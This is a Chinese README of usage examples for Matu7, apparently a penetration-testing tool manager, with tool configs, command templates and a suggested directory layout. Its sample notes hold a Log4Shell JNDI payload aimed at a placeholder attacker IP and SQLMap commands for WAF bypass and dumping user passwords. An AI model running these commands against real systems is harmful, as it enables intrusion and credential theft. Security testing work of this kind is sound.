# Matu7 使用示例

本目录包含Matu7的使用示例和最佳实践，帮助您更好地利用Matu7管理渗透测试工具。

## 目录

- [离线工具管理示例](#离线工具管理示例)
- [网页工具管理示例](#网页工具管理示例)
- [网页笔记管理示例](#网页笔记管理示例)
- [工具库组织最佳实践](#工具库组织最佳实践)

## 离线工具管理示例

### 基本工具配置

以下是一些常用渗透测试工具的配置示例：

#### Nmap

```json
{
  "id": "nmap-123456",
  "name": "Nmap",
  "category": "扫描工具",
  "path": "/path/to/tools/扫描工具/nmap",
  "description": "强大的网络扫描和主机发现工具",
  "tags": ["扫描", "端口", "网络"],
  "command": "./nmap -sV -p 1-1000 ${TARGET_IP}",
  "url": "https://nmap.org",
  "icon": "nmap.png",
  "usage_count": 15
}
```

#### Metasploit

```json
{
  "id": "metasploit-123456",
  "name": "Metasploit Framework",
  "category": "漏洞利用",
  "path": "/path/to/tools/漏洞利用/metasploit",
  "description": "渗透测试人员必备的漏洞利用框架",
  "tags": ["漏洞利用", "框架", "后渗透"],
  "command": "./msfconsole",
  "url": "https://www.metasploit.com",
  "icon": "metasploit.png",
  "usage_count": 23
}
```

### 高级命令配置

#### 带参数的命令

```json
{
  "command": "python3 ${TOOL_PATH}/script.py --target ${TARGET} --port 443 --output ${TOOL_PATH}/results.txt"
}
```

#### Windows特定命令

```json
{
  "command": "powershell -ExecutionPolicy Bypass -File \"${TOOL_PATH}\\scanner.ps1\" -Target ${TARGET_IP}"
}
```

#### 带环境变量的命令

```json
{
  "command": "export PYTHONPATH=${TOOL_PATH}/lib && python3 ${TOOL_PATH}/main.py"
}
```

## 网页工具管理示例

### 常用在线工具配置

#### VirusTotal

```json
{
  "id": "virustotal-123456",
  "name": "VirusTotal",
  "url": "https://www.virustotal.com",
  "description": "文件和URL的多引擎恶意软件扫描服务",
  "category": "安全分析",
  "tags": ["恶意软件", "扫描", "分析"],
  "usage_count": 42
}
```

#### Shodan

```json
{
  "id": "shodan-123456",
  "name": "Shodan",
  "url": "https://www.shodan.io",
  "description": "互联网设备搜索引擎",
  "category": "情报收集",
  "tags": ["搜索引擎", "资产发现", "情报"],
  "usage_count": 38
}
```

### 分类组织示例

```
安全分析
  ├── VirusTotal
  ├── Any.Run
  └── Hybrid Analysis
情报收集
  ├── Shodan
  ├── Censys
  └── ZoomEye
漏洞情报
  ├── ExploitDB
  ├── CVE Details
  └── NIST NVD
```

## 网页笔记管理示例

### 漏洞复现笔记

```json
{
  "id": "cve-2021-44228-123456",
  "title": "Log4Shell (CVE-2021-44228) 漏洞复现",
  "url": "https://example.com/blog/log4shell-analysis",
  "source": "安全博客",
  "tool": "JNDI-Exploit-Kit",
  "tags": ["Java", "RCE", "Log4j"],
  "note": "# Log4Shell 漏洞复现步骤\n\n## 环境准备\n1. 搭建易受攻击的Java应用\n2. 配置JNDI-Exploit-Kit\n\n## 攻击步骤\n1. 启动JNDI-Exploit-Kit: `java -jar JNDI-Exploit-Kit.jar -A 攻击者IP`\n2. 构造Payload: `${jndi:ldap://攻击者IP:1389/Basic/Command/Base64/命令}`\n3. 将Payload发送到目标应用\n\n## 检测方法\n1. 查看日志中的JNDI查询\n2. 监控异常的LDAP/RMI连接\n\n## 修复建议\n1. 更新Log4j到最新版本\n2. 设置系统属性: `-Dlog4j2.formatMsgNoLookups=true`"
}
```

### 工具使用笔记

```json
{
  "id": "sqlmap-tutorial-123456",
  "title": "SQLMap高级用法笔记",
  "url": "https://example.com/tutorials/sqlmap-advanced",
  "source": "安全教程网站",
  "tool": "SQLMap",
  "tags": ["SQL注入", "自动化", "数据库"],
  "note": "# SQLMap高级用法\n\n## 绕过WAF的技巧\n- 使用`--tamper`脚本组合: `sqlmap -u \"URL\" --tamper=space2comment,charencode`\n- 调整请求延迟: `--delay=2 --timeout=5`\n\n## 自定义注入点\n- 使用星号标记: `sqlmap -u \"URL/id=*\"`\n- POST数据中的注入点: `sqlmap -u \"URL\" --data=\"id=*&user=admin\"`\n\n## 提取数据技巧\n- 获取特定表的内容: `--tables -T users --dump`\n- 条件查询: `--dump -T users -C username,password --where=\"username='admin'\"`\n\n## 高级选项\n- 使用代理链: `--proxy=http://proxy1:8080 --proxy-cred=user:pass`\n- 自定义User-Agent: `--user-agent=\"Mozilla/5.0...\"`"
}
```

## 工具库组织最佳实践

### 目录结构建议

为了最大化Matu7的自动识别功能，建议按照以下结构组织您的工具库：

```
/tools/
├── 信息收集/
│   ├── 子域名扫描/
│   │   ├── subfinder/
│   │   ├── amass/
│   │   └── sublist3r/
│   ├── 端口扫描/
│   │   ├── nmap/
│   │   ├── masscan/
│   │   └── rustscan/
│   └── 指纹识别/
│       ├── whatweb/
│       └── wappalyzer-cli/
├── 漏洞扫描/
│   ├── 综合扫描器/
│   │   ├── nikto/
│   │   └── nuclei/
│   ├── Web漏洞扫描/
│   │   ├── sqlmap/
│   │   └── xsser/
│   └── 特定漏洞/
│       ├── log4j-scan/
│       └── heartbleed-scanner/
├── 漏洞利用/
│   ├── 综合框架/
│   │   ├── metasploit/
│   │   └── beef/
│   └── 特定漏洞利用/
│       ├── eternalblue/
│       └── shellshock/
└── 后渗透/
    ├── 权限提升/
    │   ├── linux-smart-enumeration/
    │   └── wesng/
    ├── 横向移动/
    │   ├── mimikatz/
    │   └── bloodhound/
    └── 数据收集/
        ├── lazagne/
        └── loot-collector/
```

### 标签使用建议

为了更有效地组织和搜索工具，建议使用以下类型的标签：

1. **工具类型标签**：`扫描器`、`框架`、`利用工具`、`枚举工具`等
2. **技术领域标签**：`Web安全`、`网络安全`、`无线安全`、`移动安全`等
3. **漏洞类型标签**：`SQL注入`、`XSS`、`命令注入`、`缓冲区溢出`等
4. **目标系统标签**：`Windows`、`Linux`、`AWS`、`Docker`等
5. **编程语言标签**：`Python`、`Go`、`Ruby`、`C++`等

### 命令模板

以下是一些常用命令模板，可以根据需要进行调整：

#### 基本命令模板

```
# 可执行文件
${TOOL_PATH}/工具名 [参数]

# Python脚本
python3 ${TOOL_PATH}/script.py [参数]

# Ruby脚本
ruby ${TOOL_PATH}/script.rb [参数]

# Shell脚本
bash ${TOOL_PATH}/script.sh [参数]

# PowerShell脚本 (Windows)
powershell -ExecutionPolicy Bypass -File "${TOOL_PATH}\script.ps1" [参数]
```

#### 带目标参数的命令模板

```
${TOOL_PATH}/工具名 -t ${TARGET_HOST} -p ${TARGET_PORT} -o ${TOOL_PATH}/results.txt
```

#### 带用户交互的命令模板

```
cd ${TOOL_PATH} && ./工具名 --interactive
``` 